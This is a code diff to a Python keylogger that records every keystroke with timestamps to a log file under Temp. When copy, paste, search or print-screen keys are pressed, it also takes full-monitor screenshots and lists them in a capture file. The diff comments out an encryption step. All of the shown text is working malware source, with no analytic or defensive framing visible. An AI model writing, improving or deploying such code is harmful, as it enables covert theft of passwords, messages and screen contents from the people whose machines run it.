@@ -13,39 +13,44 @@ from Crypto.Util.Padding import pad, unpad
 # keyloger
 def keystroke(key):
 
-    letter = string.ascii_letters
+    # letter = string.ascii_letters
+    ch = 0
     lt = 0
-    t = str(datetime.datetime.now().strftime("%H : %M : %S >> "))
+    t = str(datetime.datetime.now().strftime("\n%H : %M : %S "))
     key = str(key).replace("'","")
-       
+
     if key == "\\x03":
         lt = 0
+        ch = 1
         key = "_Copy"
         capturekey("_Copy")
     if key == "\\x16":
         lt = 0
+        ch = 1
         key = "_Paste"
         capturekey("_Paste")
     if key == "\\x06":
         lt = 0
+        ch = 1
         key = "_search"
         capturekey("_Search")
-    if key == "Key.print_screen ":
+    if key == "Key.print_screen":
         lt = 0
+        ch = 1
         key = "_print screen"
         capturekey("_printsct")
-    # if key == ("Key.ctrl_l") or key == ("Key.right") or key == ("Key.left") or key == ("Key.up") or key == ("Key.down") or key == ("Key.backspace") or key == ("Key.space") or key == ("Key.enter") or key == ("\\x13") or key == ("\\x01"):
-    #     key = ''
-    if( key in letter):
+    if not("Key" in key) and (ch == 0):
         lt = 1
     else :
         lt = 0
-        key += '\n'
+        key = key +'\n'
 
-    if lt == 0:
-        with open("Temp/log_data.txt", 'a') as f:
-        # with open("log_interrupt.txt", 'a') as f:
+    with open("Temp/log_data.txt", 'a') as f:
+        if lt:
+            f.write(key)
+        else:
             f.write(t + key)
+            ch = 0
 
 # capture
 def capturekey(k):
@@ -57,11 +62,10 @@ def capturekey(k):
     with mss() as sct:
         sct.shot(mon=-1, output=x)
 
-    with open('Temp/Capture.txt', 'w') as f:
+    with open('Temp/Capture.txt', 'a') as f:
         f.write(x + '\n')
 
-    # pyautogui.screenshot().save('Temp\\Capture\\'+x)
-    encrypt(x)
+    # encrypt(x)
 
 def encrypt(file):
     print("encrypt\n")
